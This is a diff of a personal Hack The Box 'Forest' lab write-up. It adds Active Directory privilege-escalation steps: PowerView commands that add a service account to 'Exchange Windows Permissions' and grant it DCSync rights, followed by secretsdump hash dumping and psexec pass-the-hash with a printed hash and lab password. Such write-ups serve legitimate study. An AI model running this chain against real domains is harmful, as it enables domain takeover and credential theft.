@@ -103,34 +103,71 @@ evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
 >![[Pasted image 20250312164819.png]]
 
 # Privilege Escalation
-- We cant use [[impacket-secretsdump]] because the user cant use RPC using this tools:
+- We cant use [[impacket-secretsdump]] because the user cant use RPC (port 49667) using this tools, (we don't have permisions)[^1]:
 >[!example]- Result
 >![[Pasted image 20250312231844.png]]
 >![[Pasted image 20250312231846.png]]
 
 - we can use [[bloodhaunt]] to get a better view
-```bash
+```powershell
 .\SharpHound.exe -c ALL
 ```
 >[!example]- Result
 >![[Pasted image 20250313001403.png]]
->![[Pasted image 20250313000810.png]]
+>![[Pasted image 20250313111111.png]]
 
 >[!warning] I recommed to use SharpHound.exe last version, becasuse [[bloodhaund-python]] didn't report me the correct path
 
 - we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recommended way) or using [[PowerView]] (recommended way)
 >[!warning] You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL
 
-```bash
+```powershell
 . .\PowerView.ps1
 
 $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
-Add-DomainGroupMember -Identity 'KEY ADMINS' -Members 'svc-alfresco' -Credential $Cred
-Get-DomainGroupMember -Identity 'KEY ADMINS'
+Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred
+Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
 ```
 >[!example]- Result
->![[Pasted image 20250313100713.png]]
+>![[Pasted image 20250313111316.png]]
 
 
+- Now we can do the next step "WriteDacl", keep in mind that the current session has the old permission (not the new permission with `EXCHANGE WINDOWS PERMISSIONS`), so we need to create a new credentials(PScredentials), `TargetIdentity` can be `DC=htb,DC=local` or `htb.local\Domain Admins`, "Referring Objects"[^2]
+```powershell
+$SecPassword2 = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword2)
+Add-DomainObjectAcl -Credential $Cred2 -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
+```
+>[!cite]- One-Liner
+>```pwsh
+>. .\PowerView.ps1; $Cred=New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',(ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $Cred;  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
+>```
 
+- now we can use [[impacket-secretsdump]] to dump hashes and [[psexec.py]] to get access
+```bash
+psexec.py FOREST.htb.local/administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'
+secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+```
+>[!example]- Result
+>![[Pasted image 20250313121110.png]]
+>![[Pasted image 20250313121045.png]]
+
+# Note
+- You have to do this process as fast as u can because there are a task that clean up all permision since 60s
+```bash
+schtasks /query /fo table
+schtasks /query /tn restore /v /fo list
+type C:\Users\Administrator\Documents\revert.ps1
+```
+>[!example]- Result
+>![[Pasted image 20250313121553.png]]
+>![[Pasted image 20250313122420.png]]
+>![[Pasted image 20250313122528.png]]
+
+---
+# Definitions
+
+[^1]: The Program use this ports: ![[Pasted image 20250313125256.png]]
+
+[^2]: In **Active Directory**, when referring to a **group or user**, the system can usually resolve the name using a more friendly notation (like `'htb.local\Domain Admins'`) without needing to specify the full Distinguished Name, as you would with `'DC=htb,DC=local'`. However, for the **domain itself** or **higher-level objects** (like the root of the domain), you must reference it using the full **Distinguished Name**, since `'htb.local'` alone is not sufficient to correctly identify the root domain.
